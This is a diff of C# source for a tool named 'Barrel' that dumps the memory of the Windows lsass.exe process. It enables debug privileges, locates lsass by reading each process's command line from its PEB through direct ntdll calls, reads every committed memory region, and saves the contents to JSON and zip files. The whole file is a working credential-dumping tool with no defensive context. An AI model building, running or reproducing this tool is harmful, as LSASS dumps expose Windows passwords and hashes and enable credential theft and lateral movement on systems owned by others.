@@ -1,109 +1,56 @@
 ﻿using System;
+using System.IO;
 using System.Linq;
 using System.Diagnostics;
+using System.IO.Compression;
+using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using static Barrel.NT;
-using System.Collections.Generic;
-using System.Text;
-using System.IO.Compression;
-using System.IO;
-using System.Runtime.InteropServices.ComTypes;
 
 
 namespace Barrel
 {
     internal class Program
     {
+        // Constants
         public const int MEM_COMMIT = 0x00001000;
         public const int PAGE_NOACCESS = 0x01;
-        public const uint PROCESS_QUERY_INFORMATION = 0x0400;
-        public const uint PROCESS_VM_READ = 0x0010;
         public const uint MemoryBasicInformation = 0;
-        public const uint OBJ_CASE_INSENSITIVE = 0x00000040;
-        public const uint FileAccess_FILE_GENERIC_WRITE = 0x120116;
-        public const uint FileAttributes_Normal = 128;
-        public const uint FileShare_Write = 2;
-        public const uint CreationDisposition_FILE_OVERWRITE_IF = 5;
-        public const uint CreateOptionFILE_SYNCHRONOUS_IO_NONALERT = 32;
         public const uint TOKEN_QUERY = 0x00000008;
         public const uint TOKEN_ADJUST_PRIVILEGES = 0x00000020;
 
+        // Functions
+        [DllImport("ntdll.dll")] public static extern uint NtOpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, ref IntPtr TokenHandle);
 
-        [DllImport("ntdll.dll")]
-        public static extern bool NtReadVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+        [DllImport("ntdll.dll")] public static extern uint NtAdjustPrivilegesToken(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
 
-        [DllImport("ntdll.dll")]
-        public static extern uint NtQueryVirtualMemory(IntPtr hProcess, IntPtr lpAddress, uint MemoryInformationClass, out MEMORY_BASIC_INFORMATION MemoryInformation, uint MemoryInformationLength, out uint ReturnLength);
+        [DllImport("ntdll.dll")] public static extern uint NtClose(IntPtr hObject);
 
-        [DllImport("ntdll.dll")]
-        public static extern void RtlInitUnicodeString(out UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);
+        [DllImport("ntdll.dll")] public static extern bool NtGetNextProcess(IntPtr handle, int MAX_ALLOWED, int param3, int param4, out IntPtr outHandle);
 
-        [DllImport("ntdll.dll", SetLastError = true)]
-        public static extern uint NtCreateFile(out IntPtr FileHadle, uint DesiredAcces, ref OBJECT_ATTRIBUTES ObjectAttributes, ref IO_STATUS_BLOCK IoStatusBlock, ref long AllocationSize, uint FileAttributes, uint ShareAccess, uint CreateDisposition, uint CreateOptions, IntPtr EaBuffer, uint EaLength);
+        [DllImport("ntdll.dll", SetLastError = true)] public static extern uint NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, IntPtr pbi, uint processInformationLength, out uint returnLength);
 
-        [DllImport("ntdll.dll")]
-        public static extern uint NtWriteFile(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, ref IO_STATUS_BLOCK IoStatusBlock, byte[] Buffer, uint Length, IntPtr ByteOffset, IntPtr Key);
+        [DllImport("ntdll.dll")] public static extern uint NtQueryVirtualMemory(IntPtr hProcess, IntPtr lpAddress, uint MemoryInformationClass, out MEMORY_BASIC_INFORMATION MemoryInformation, uint MemoryInformationLength, out uint ReturnLength);
 
-        [DllImport("ntdll.dll")]
-        public static extern uint NtOpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, ref IntPtr TokenHandle);
+        [DllImport("ntdll.dll")] public static extern uint NtReadVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
 
-        [DllImport("ntdll.dll")]
-        public static extern uint NtAdjustPrivilegesToken(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
+        // Structures
+        [StructLayout(LayoutKind.Sequential)] public struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID Luid; public uint Attributes; }
 
-        [DllImport("ntdll.dll")]
-        public static extern uint NtClose(IntPtr hObject);
+        [StructLayout(LayoutKind.Sequential)] public struct LUID { public uint LowPart; public int HighPart; }
 
+        [StructLayout(LayoutKind.Sequential)] public struct MEMORY_BASIC_INFORMATION { public IntPtr BaseAddress; public IntPtr AllocationBase; public int AllocationProtect; public IntPtr RegionSize; public int State; public int Protect; public int Type; }
 
-        public struct MEMORY_BASIC_INFORMATION
+        // Custom Class
+        public class MemFile
         {
-            public IntPtr BaseAddress;
-            public IntPtr AllocationBase;
-            public int AllocationProtect;
-            public IntPtr RegionSize;
-            public int State;
-            public int Protect;
-            public int Type;
-        }
-
-        [StructLayout(LayoutKind.Sequential, Pack = 0)]
-        public struct OBJECT_ATTRIBUTES
-        {
-            public int Length;
-            public IntPtr RootDirectory;
-            public IntPtr ObjectName;
-            public uint Attributes;
-            public IntPtr SecurityDescriptor;
-            public IntPtr SecurityQualityOfService;
-        }
-
-        [StructLayout(LayoutKind.Sequential, Pack = 0)]
-        public struct IO_STATUS_BLOCK
-        {
-            public uint status;
-            public IntPtr information;
-        }
-
-        [StructLayout(LayoutKind.Sequential, Pack = 0)]
-        public struct UNICODE_STRING
-        {
-            public ushort Length;
-            public ushort MaximumLength;
-            public IntPtr Buffer;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct TOKEN_PRIVILEGES
-        {
-            public uint PrivilegeCount;
-            public LUID Luid;
-            public uint Attributes;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct LUID
-        {
-            public uint LowPart;
-            public int HighPart;
+            public string filename;
+            public byte[] content;
+            public MemFile(string filename, byte[] content)
+            {
+                this.filename = filename;
+                this.content = content;
+            }
         }
 
 
@@ -140,55 +87,6 @@ namespace Barrel
                 {
                     NtClose(tokenHandle);
                 }
-            }
-        }
-
-
-        static void WriteToBinFile(byte[] buffer, int bufferSize, string filename)
-        {
-            // Create to file
-            IntPtr hFile;
-            UNICODE_STRING fname = new UNICODE_STRING();
-            string current_dir = System.IO.Directory.GetCurrentDirectory();
-            RtlInitUnicodeString(out fname, @"\??\" + current_dir + "\\" + filename);
-            IntPtr objectName = Marshal.AllocHGlobal(Marshal.SizeOf(fname));
-            Marshal.StructureToPtr(fname, objectName, true);
-            OBJECT_ATTRIBUTES FileObjectAttributes = new OBJECT_ATTRIBUTES
-            {
-                Length = (int)Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES)),
-                RootDirectory = IntPtr.Zero,
-                ObjectName = objectName,
-                Attributes = OBJ_CASE_INSENSITIVE,
-                SecurityDescriptor = IntPtr.Zero,
-                SecurityQualityOfService = IntPtr.Zero
-            };
-            IO_STATUS_BLOCK IoStatusBlock = new IO_STATUS_BLOCK();
-            long allocationSize = 0;
-            uint ntstatus = NtCreateFile(
-                out hFile,
-                FileAccess_FILE_GENERIC_WRITE,
-                ref FileObjectAttributes,
-                ref IoStatusBlock,
-                ref allocationSize,
-                FileAttributes_Normal, // 0x80 = 128 https://learn.microsoft.com/es-es/dotnet/api/system.io.fileattributes?view=net-7.0
-                FileShare_Write, // 2 - https://learn.microsoft.com/en-us/dotnet/api/system.io.fileshare?view=net-8.0
-                CreationDisposition_FILE_OVERWRITE_IF, // 5 - https://code.googlesource.com/bauxite/+/master/sandbox/win/src/nt_internals.h
-                CreateOptionFILE_SYNCHRONOUS_IO_NONALERT, // 32 -  https://code.googlesource.com/bauxite/+/master/sandbox/win/src/nt_internals.h
-                IntPtr.Zero,
-                0
-            );
-            if (ntstatus != 0)
-            {
-                Console.WriteLine("[-] Calling NtOpenFile failed.");
-                Environment.Exit(0);
-            }
-
-            // Write to file
-            ntstatus = NtWriteFile(hFile, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref IoStatusBlock, buffer, (uint)bufferSize, IntPtr.Zero, IntPtr.Zero);
-            if (ntstatus != 0)
-            {
-                Console.WriteLine("[-] Calling NtWriteFile failed.");
-                Environment.Exit(0);
             }
         }
 
@@ -235,40 +133,59 @@ namespace Barrel
         }
 
 
-        public static List<IntPtr> GetProcessByName(string proc_name)
+        public static IntPtr ReadRemoteIntPtr(IntPtr hProcess, IntPtr mem_address)
         {
-            IntPtr aux_handle = IntPtr.Zero;
-            int MAXIMUM_ALLOWED = 0x02000000;
-            List<IntPtr> handles_list = new List<IntPtr>();
-
-            while (!NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, out aux_handle))
+            byte[] buff = new byte[8];
+            uint ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, buff.Length, out _);
+            if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != IntPtr.Zero)
             {
-                StringBuilder fileName = new StringBuilder(100);
-                GetProcessImageFileName(aux_handle, fileName, 100);
-                char[] stringArray = fileName.ToString().ToCharArray();
-                Array.Reverse(stringArray);
-                string reversedStr = new string(stringArray);
-                int index = reversedStr.IndexOf("\\");
-                if (index != -1)
-                {
-                    string res = reversedStr.Substring(0, index);
-                    stringArray = res.ToString().ToCharArray();
-                    Array.Reverse(stringArray);
-                    res = new string(stringArray);
-                    if (res == proc_name)
-                    {
-                        handles_list.Add(aux_handle);
-                    }
-                }
+                Console.WriteLine("[-] Error calling NtReadVirtualMemory (ReadRemoteIntPtr). NTSTATUS: 0x" + ntstatus.ToString("X") + " reading address 0x" + mem_address.ToString("X"));
             }
-            return handles_list;
+            long value = BitConverter.ToInt64(buff, 0);
+            return (IntPtr)value;
         }
 
 
-        unsafe static int get_pid(IntPtr process_handle)
+        public static string ReadRemoteWStr(IntPtr hProcess, IntPtr mem_address)
+        {
+            byte[] buff = new byte[256];
+            uint ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, buff.Length, out _);
+            if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != IntPtr.Zero)
+            {
+                Console.WriteLine("[-] Error calling NtReadVirtualMemory (ReadRemoteWStr). NTSTATUS: 0x" + ntstatus.ToString("X") + " reading address 0x" + mem_address.ToString("X"));
+            }
+            string unicode_str = "";
+            for (int i = 0; i < buff.Length - 1; i += 2)
+            {
+                if (buff[i] == 0 && buff[i + 1] == 0) { break; }
+                unicode_str += BitConverter.ToChar(buff, i);
+            }
+            return unicode_str;
+        }
+
+
+        public static IntPtr GetProcessByName(string proc_name)
+        {
+            IntPtr aux_handle = IntPtr.Zero;
+            int MAXIMUM_ALLOWED = 0x02000000;
+
+            while (!NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, out aux_handle))
+            {
+                string current_proc_name = GetProcNameFromHandle(aux_handle);
+                if (current_proc_name == proc_name)
+                {
+                    return aux_handle;
+                }
+            }
+            return IntPtr.Zero;
+        }
+
+
+        unsafe static string GetProcNameFromHandle(IntPtr process_handle)
         {
             uint process_basic_information_size = 48;
-            int pid_offset = 0x20;
+            int peb_offset = 0x8;
+            int commandline_offset = 0x68;
 
             // Create byte array with the size of the PROCESS_BASIC_INFORMATION structure
             byte[] pbi_byte_array = new byte[process_basic_information_size];
@@ -287,9 +204,19 @@ namespace Barrel
             }
 
             // Get PEB Base Address
-            IntPtr peb_pointer = pbi_addr + pid_offset;
+            IntPtr peb_pointer = pbi_addr + peb_offset;
             IntPtr pebaddress = Marshal.ReadIntPtr(peb_pointer);
-            return (int)pebaddress;
+
+            // Get PEB->ProcessParameters
+            int processparameters_offset = 0x20;
+            IntPtr processparameters_pointer = pebaddress + processparameters_offset;
+
+            // Get ProcessParameters->CommandLine
+            IntPtr processparameters_adress = ReadRemoteIntPtr(process_handle, processparameters_pointer);
+            IntPtr commandline_pointer = processparameters_adress + commandline_offset;
+            IntPtr commandline_address = ReadRemoteIntPtr(process_handle, commandline_pointer);
+            string commandline_value = ReadRemoteWStr(process_handle, commandline_address);
+            return commandline_value;
         }
 
 
@@ -316,18 +243,6 @@ namespace Barrel
         }
 
 
-        public class MemFile {
-            public string filename;
-            public  byte[] content;
-
-            public MemFile(string filename, byte[] content)
-            {
-                this.filename = filename;
-                this.content = content;
-            }
-        }
-
-
         static void Barrel(string json_filename, string zip_filename) {
             // Random seed
             Random random = new Random();
@@ -336,10 +251,9 @@ namespace Barrel
             EnableDebugPrivileges();
 
             // Get process name
-            string proc_name = "lsass.exe";
-            IntPtr processHandle = GetProcessByName(proc_name).First();
+            string proc_name = "C:\\WINDOWS\\system32\\lsass.exe";
+            IntPtr processHandle = GetProcessByName(proc_name);
             Console.WriteLine("[+] Process handle:  \t\t\t\t" + processHandle);
-
             // Loop the memory regions
             long proc_max_address_l = (long)0x7FFFFFFEFFFF;
             IntPtr aux_address = IntPtr.Zero;
@@ -369,6 +283,9 @@ namespace Barrel
                 // Next memory region
                 aux_address = (IntPtr)((ulong)aux_address + (ulong)mbi.RegionSize);
             }
+            // Close process handle
+            NtClose(processHandle);
+            
             // Write JSON file
             string barrel_json_content = ToJsonArray(aux_array_1);
             WriteToFile(json_filename, barrel_json_content);
